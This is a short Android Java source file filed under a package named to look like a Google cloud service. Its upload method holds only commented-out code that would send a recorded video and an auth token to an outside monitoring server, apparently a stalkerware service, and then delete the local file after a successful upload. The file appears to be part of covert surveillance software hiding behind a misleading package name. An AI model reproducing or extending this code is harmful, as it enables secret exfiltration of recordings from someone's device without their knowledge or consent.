package com.google.cloudservices;
import android.content.Context;

public class UploadClass {
    public void Upload(Context context,String path) {




//        final String url_ = "https://im.kidsguard.pro/api/put-video/";
//        Ion.with(context)
//                .load("POST",url_)
//                .setMultipartFile("video", new File(Uri.parse(path).toString()))
//                .setMultipartParameter("token", getToken(context))
//                .setMultipartParameter("token1", "allow")
//                .asString()
//                .setCallback(new FutureCallback<String>() {
//                    @Override
//                    public void onCompleted(Exception e, String result) {
////                        Log.e("Ex43", result );
////                        try {
////                            JSONObject jsonObject=new JSONObject(result);
////                            if (jsonObject.getString("status").equals("ok")){
////                                new File(Uri.parse(path).toString()).delete();
////                            }
////                        } catch (JSONException e1) {
////                            e1.printStackTrace();
////                        }
//                        //     Toast.makeText(getApplicationContext(),""+file,Toast.LENGTH_LONG).show();
//
//
//                        // Toast.makeText(getApplicationContext(), "Exception : " + e, Toast.LENGTH_LONG).show();
//
//                        // Toast.makeText(getApplicationContext(),""+e,Toast.LENGTH_LONG).show();
//
//
//
//
//
//                    }
//                });
    }
    public String getToken(Context context) {
        String token = null;
        TokenDataBaseManager tokenDataBaseManager = new TokenDataBaseManager(context);
        token = tokenDataBaseManager.gettoken();
        tokenDataBaseManager.close();
        return token;

    }
}
